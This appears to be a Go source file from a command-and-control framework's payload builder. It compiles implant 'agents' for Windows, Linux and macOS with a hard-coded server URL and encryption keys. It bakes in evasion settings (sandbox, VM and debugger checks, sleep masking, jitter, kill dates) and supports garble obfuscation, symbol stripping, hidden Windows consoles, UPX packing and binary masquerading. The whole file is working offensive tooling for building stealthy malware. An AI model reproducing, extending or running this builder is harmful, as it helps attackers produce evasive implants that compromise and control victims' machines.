package main

import (
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"time"
)

type TargetOS string

const (
	OSWindows TargetOS = "windows"
	OSLinux   TargetOS = "linux"
	OSDarwin  TargetOS = "darwin"
)

type TargetArch string

const (
	ArchAMD64 TargetArch = "amd64"
	ArchARM64 TargetArch = "arm64"
	Arch386   TargetArch = "386"
)

type Format string

const (
	FormatEXE        Format = "exe"
	FormatELF        Format = "elf"
	FormatShellcode  Format = "shellcode"
	FormatDLL        Format = "dll"
	FormatPowerShell Format = "ps1"
)

// OpsecProfile holds OPSEC settings baked into the compiled agent.
type OpsecProfile struct {
	Name               string        `json:"name"`
	SleepInterval      time.Duration `json:"sleep_interval"`
	JitterPercent      int           `json:"jitter_percent"`
	MaxRetries         int           `json:"max_retries"`
	EnableSandboxCheck bool          `json:"enable_sandbox_check"`
	EnableVMCheck      bool          `json:"enable_vm_check"`
	EnableDebugCheck   bool          `json:"enable_debug_check"`
	SleepMasking       bool          `json:"sleep_masking"`
	UserAgentRotation  bool          `json:"user_agent_rotation"`
	KillDate           string        `json:"kill_date"`
	WorkingHoursOnly   bool          `json:"working_hours_only"`
	WorkingHoursStart  int           `json:"working_hours_start"`
	WorkingHoursEnd    int           `json:"working_hours_end"`
	ExecMethod         string        `json:"exec_method"`
	Obfuscate          bool          `json:"obfuscate"`
	Masquerade         MasqueradeConfig `json:"masquerade"`
}

// Config holds all parameters for a payload build.
type Config struct {
	ServerURL    string
	ListenerID   string
	EncKey       string
	SecondaryKey string

	TargetOS   TargetOS
	TargetArch TargetArch
	Format     Format

	OutputName string
	OutputDir  string
	StripSyms  bool
	Compress   bool
	NoGUI      bool

	Profile *OpsecProfile
}

// Result holds the outcome of a build.
type Result struct {
	OutputPath string
	FileSize   int64
	MD5        string
	SHA256     string
	BuildTime  time.Duration
	Format     Format
}

// Generator compiles agent payloads from source.
type Generator struct {
	sourceDir string
}

// New creates a Generator. sourceDir is the Go package path to cmd/agent.
func New(sourceDir string) *Generator {
	return &Generator{sourceDir: sourceDir}
}

// Build compiles an agent with the given configuration.
func (g *Generator) Build(cfg *Config) (*Result, error) {
	if err := g.validate(cfg); err != nil {
		return nil, fmt.Errorf("invalid config: %v", err)
	}

	start := time.Now()

	if cfg.OutputDir == "" {
		cfg.OutputDir = "./output"
	}
	if err := os.MkdirAll(cfg.OutputDir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create output dir: %v", err)
	}

	outPath := filepath.Join(cfg.OutputDir, g.outputFilename(cfg))

	// Per-build random salt so two implants on the same host get distinct UUIDs.
	salt := make([]byte, 8)
	rand.Read(salt) //nolint:errcheck

	ldflags := "-X main.serverURL=" + cfg.ServerURL +
		" -X main.encKey=" + cfg.EncKey +
		" -X main.secondaryKey=" + cfg.SecondaryKey +
		" -X main.instanceSalt=" + hex.EncodeToString(salt)

	if cfg.Profile != nil {
		p := cfg.Profile
		ldflags += " -X main.defaultInterval=" + strconv.FormatInt(int64(p.SleepInterval.Seconds()), 10)
		ldflags += " -X main.defaultJitter=" + strconv.Itoa(p.JitterPercent)
		ldflags += " -X main.defaultMaxRetries=" + strconv.Itoa(p.MaxRetries)
		ldflags += " -X main.defaultKillDate=" + p.KillDate
		ldflags += " -X main.defaultWorkingHoursOnly=" + strconv.FormatBool(p.WorkingHoursOnly)
		ldflags += " -X main.defaultWorkingHoursStart=" + strconv.Itoa(p.WorkingHoursStart)
		ldflags += " -X main.defaultWorkingHoursEnd=" + strconv.Itoa(p.WorkingHoursEnd)
		ldflags += " -X main.defaultEnableEvasion=" + strconv.FormatBool(
			p.EnableSandboxCheck || p.EnableVMCheck || p.EnableDebugCheck)
		ldflags += " -X main.defaultSleepMasking=" + strconv.FormatBool(p.SleepMasking)
		ldflags += " -X main.defaultUserAgentRotation=" + strconv.FormatBool(p.UserAgentRotation)
		if p.ExecMethod != "" {
			ldflags += " -X main.defaultExecMethod=" + p.ExecMethod
		}

		if p.Masquerade.Enabled && cfg.TargetOS == OSWindows {
			cleanup, err := applyMasquerade(g.sourceDir, p.Masquerade, string(cfg.TargetArch))
			if err != nil {
				return nil, fmt.Errorf("masquerade: %v", err)
			}
			defer cleanup()
		}
	}

	if cfg.StripSyms {
		ldflags += " -s -w"
	}
	if cfg.NoGUI && cfg.TargetOS == OSWindows {
		ldflags += " -H windowsgui"
	}

	goBin := "go"
	var args []string
	if cfg.Profile != nil && cfg.Profile.Obfuscate {
		goBin = "garble"
		args = []string{"-tiny", "-seed=random", "build", "-ldflags", ldflags, "-o", outPath, g.sourceDir}
	} else {
		args = []string{"build", "-ldflags", ldflags, "-o", outPath, g.sourceDir}
	}

	cmd := exec.Command(goBin, args...)
	cmd.Env = append(os.Environ(),
		"GOOS="+string(cfg.TargetOS),
		"GOARCH="+string(cfg.TargetArch),
		"CGO_ENABLED=0",
	)

	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("build failed: %v\n%s", err, out)
	}

	if cfg.Compress {
		exec.Command("upx", "--best", outPath).Run() //nolint
	}

	info, err := os.Stat(outPath)
	if err != nil {
		return nil, fmt.Errorf("output file not found: %v", err)
	}

	checksums, _ := g.checksums(outPath)

	return &Result{
		OutputPath: outPath,
		FileSize:   info.Size(),
		MD5:        checksums["md5"],
		SHA256:     checksums["sha256"],
		BuildTime:  time.Since(start),
		Format:     cfg.Format,
	}, nil
}

func (g *Generator) validate(cfg *Config) error {
	if cfg.ServerURL == "" {
		return fmt.Errorf("server URL is required")
	}
	if cfg.EncKey == "" {
		return fmt.Errorf("encryption key is required")
	}
	if cfg.TargetOS == "" {
		return fmt.Errorf("target OS is required")
	}
	if cfg.TargetArch == "" {
		return fmt.Errorf("target arch is required")
	}
	return nil
}

func (g *Generator) outputFilename(cfg *Config) string {
	name := cfg.OutputName
	if name == "" {
		name = "agent"
	}
	if cfg.TargetOS == OSWindows {
		name += ".exe"
	}
	return name
}

func (g *Generator) checksums(path string) (map[string]string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	md5sum := md5.Sum(data)
	sha256sum := sha256.Sum256(data)
	return map[string]string{
		"md5":    fmt.Sprintf("%x", md5sum),
		"sha256": fmt.Sprintf("%x", sha256sum),
	}, nil
}

// DefaultOpsecProfile returns a sensible OPSEC default profile.
func DefaultOpsecProfile() *OpsecProfile {
	return &OpsecProfile{
		Name:               "default",
		SleepInterval:      30 * time.Second,
		JitterPercent:      30,
		MaxRetries:         5,
		EnableSandboxCheck: true,
		EnableVMCheck:      true,
		EnableDebugCheck:   true,
		SleepMasking:       true,
		UserAgentRotation:  true,
	}
}
